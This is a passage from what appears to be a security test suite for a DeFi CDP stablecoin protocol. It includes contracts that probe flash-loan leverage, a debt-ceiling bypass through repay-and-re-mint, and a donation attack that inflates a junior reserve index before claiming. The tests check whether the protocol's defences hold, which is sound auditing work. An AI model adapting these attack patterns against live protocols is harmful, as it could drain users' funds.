        v.open(C3, 40000e18, 1000000e18);

        uint res0 = usdstT.balanceOf(address(reserve));
        uint fee0 = usdstT.balanceOf(address(m.feeCollector()));
        fastForward(365 * 24 * 60 * 60);
        usdstT.mint(address(v), 1000e18);
        v.pokeRepay(C3, 1e18);

        uint resGain = usdstT.balanceOf(address(reserve)) - res0;
        uint feeGain = usdstT.balanceOf(address(m.feeCollector())) - fee0;
        log("1h reserve gained (stability fee): " + string(resGain));
        log("1h collector gained              : " + string(feeGain));
        require(resGain > 0, "the reserve's ONLY inflow is _routeFees from _accrue");

        // A liquidation on the SAME asset adds nothing to the reserve, at any bps setting.
        // Debt is now ~$1.05m after a year of fees; gap the price to $38 so CR < 1.50.
        _price3(C3, 38e18);
        usdstT.mint(address(desk), 5000000e18);
        desk.setPrice(C3, 38e18);
        log("1h CR before liquidation         : " + string(cdp.collateralizationRatio(address(v), C3)));
        uint resPre = usdstT.balanceOf(address(reserve));
        LoopLiquidator ll = new LoopLiquidator();
        ll.init(address(fm), address(cdp), USDST);
        ll.run(C3, address(v), address(desk), 500000e18, 1);
        uint resPost = usdstT.balanceOf(address(reserve));

        log("1h liquidator penalty captured   : " + string(ll.usdstProfit()));
        log("1h reserve delta from liquidation: " + string(resPost - resPre));
        require(ll.usdstProfit() > 0, "the liquidator took a penalty");
        require(resPost == resPre,
            "DEMONSTRATED: even with feeToReserveBps=5000 the liquidation penalty routes 0 to the reserve");
        cdp.setFeeToReserveBps(0);
    }

    function _price3(address a, uint p) internal { oracle.setAssetPrice(a, p); }
}

/// @notice One-shot leverage helper.
contract Leverager {
    FlashMint public lender;
    CDPEngine public cdp;
    address public usdst;
    address public coll;
    address public desk;

    function init(address _l, address _c, address _u) public { lender = FlashMint(_l); cdp = CDPEngine(_c); usdst = _u; }
    function seed(address _coll) public {
        coll = _coll;
        uint bal = IERC20(_coll).balanceOf(address(this));
        IERC20(_coll).approve(address(cdp.registry().cdpVault()), bal);
        cdp.deposit(_coll, bal);
    }
    function lever(address _coll, address _desk, uint borrow) public {
        coll = _coll; desk = _desk;
        lender.flashLoan(address(this), borrow, "");
    }
    function onFlashMint(address _t, uint amount, uint fee, variadic data) external returns (string) {
        IERC20(_t).approve(desk, amount);
        Desk(desk).settle(_t, amount, coll);
        uint bal = IERC20(coll).balanceOf(address(this));
        IERC20(coll).approve(address(cdp.registry().cdpVault()), bal);
        cdp.deposit(coll, bal);
        cdp.mintMax(coll);
        return "FlashMint.onFlashMint";
    }
}

/// @notice Tries to cycle repayAll -> re-mint past a per-asset debt ceiling.
contract CeilingRider {
    FlashMint public lender;
    CDPEngine public cdp;
    address public usdst;
    address public coll;
    string public ceilErr;
    uint public reMinted;

    function init(address _l, address _c, address _u) public { lender = FlashMint(_l); cdp = CDPEngine(_c); usdst = _u; }
    function seed(address _coll, uint amount) public {
        coll = _coll;
        IERC20(_coll).approve(address(cdp.registry().cdpVault()), amount);
        cdp.deposit(_coll, amount);
    }
    function mintUpTo(address _coll, uint amount) public { cdp.mint(_coll, amount); }

    function cycle(address _coll, uint principal, uint headroom) public returns (string) {
        coll = _coll;
        ceilErr = "NOT REACHED";
        lender.flashLoan(address(this), principal, headroom);
        return ceilErr;
    }
    function onFlashMint(address _t, uint amount, uint fee, variadic data) external returns (string) {
        uint headroom = uint(data[0]);
        (uint col, uint sd) = cdp.vaults(address(this), coll);
        (uint rate, uint la, uint tsd) = cdp.collateralGlobalStates(coll);
        uint owed = (sd * rate) / 1e27;

        // Wipe our debt off the books, freeing `owed` of ceiling headroom...
        cdp.repayAll(coll);
        // ...then try to take back MORE than we freed. The ceiling must still bind.
        try cdp.mint(coll, owed + headroom + 1e18) { ceilErr = "NO REVERT"; }
        catch Error(string e) { ceilErr = e; }
        // Restore exactly what we repaid so the loan can be settled.
        cdp.mint(coll, owed);
        reMinted = owed;
        return "FlashMint.onFlashMint";
    }
}

/// @notice A junior note holder that flash-mints, donates into CDPReserve to force a
///         juniorIndex bump off the LIVE `usdst.balanceOf(reserve)` read, then claims.
///         Records whether the round trip can ever return more than the donation.
contract JuniorDonor {
    FlashMint public lender;
    address public token;
    address public reserve;
    CDPEngine public cdp;

    uint public claimableDuring;
    uint public reserveDuring;
    uint public received;
    uint public donated;
    uint public capBefore;
    uint public capAfter;

    function init(address _l, address _t, address _r, address _c) public {
        lender = FlashMint(_l); token = _t; reserve = _r; cdp = CDPEngine(_c);
    }
    function openNote(address asset, uint amount) public { cdp.openJuniorNote(asset, amount); }

    function probe(uint amount) public { lender.flashLoan(address(this), amount, ""); }

    function onFlashMint(address _t, uint amount, uint fee, variadic data) external returns (string) {
        (address o0, uint c0, uint e0) = cdp.juniorNotes(address(this));
        capBefore = c0;
        donated = amount;

        IERC20(_t).transfer(reserve, amount);
        reserveDuring    = IERC20(_t).balanceOf(reserve);
        claimableDuring  = cdp.claimable(address(this));

        uint b0 = IERC20(_t).balanceOf(address(this));
        cdp.claimJunior();
        received = IERC20(_t).balanceOf(address(this)) - b0;

        (address o1, uint c1, uint e1) = cdp.juniorNotes(address(this));
        capAfter = c1;
        return "FlashMint.onFlashMint";
    }
}
